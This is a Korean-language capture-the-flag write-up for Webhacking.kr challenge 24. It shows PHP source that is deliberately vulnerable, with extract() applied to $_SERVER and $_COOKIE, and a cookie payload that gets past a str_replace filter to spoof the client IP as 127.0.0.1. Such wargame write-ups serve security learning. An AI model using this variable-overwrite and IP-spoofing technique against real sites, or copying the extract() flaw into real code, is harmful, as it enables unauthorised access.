---
layout: post
title: ! "[Webhacking.kr] 24"
categories: [Webhacking.kr]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - webhacking.kr
  - write-up
---

![](/assets/posts/webhackingkr/24_main.png)

24번 문제는 register_globals와 관련된 문제이다.
들어가자마자 Wrong IP! 라고 알려준다.

페이지 소스를 봤을때 index.phps 가 주석처리 되어있길래 index.phps 페이지에 들어가 봤더니 아래와 같은 코드가 있었다.

```php
<?

extract($_SERVER);
extract($_COOKIE);

if(!$REMOTE_ADDR) $REMOTE_ADDR=$_SERVER[REMOTE_ADDR];

$ip=$REMOTE_ADDR;
$agent=$HTTP_USER_AGENT;


if($_COOKIE[REMOTE_ADDR])
{
$ip=str_replace("12","",$ip);
$ip=str_replace("7.","",$ip);
$ip=str_replace("0.","",$ip);
}

echo("<table border=1><tr><td>client ip</td><td>$ip</td></tr><tr><td>agent</td><td>$agent</td></tr></table>");

if($ip=="127.0.0.1")
{
@solve();
}

else
{
echo("<p><hr><center>Wrong IP!</center><hr>");
}
?>
```
소스를 보면 ip가 127.0.0.1일때 문제가 풀리는 것 같다.
여기서 12,7.,0.이 공백으로 바뀌므로 두번씩 쳐줘야 한다.  `112277..00..00..1` 일때 `1(12)27(7.).0(0.).0(0.).1` 이 된다.

24번 페이지 콘솔창에서 `javascript:document.cookie="REMOTE_ADDR=112277..00..00..1;";` 를 입력해주고
새로고침을 해주면 ip가 127.0.0.1로 바뀌고 문제가 풀린다.

![](/assets/posts/webhackingkr/24_console.png)
![](/assets/posts/webhackingkr/24_clear.png)

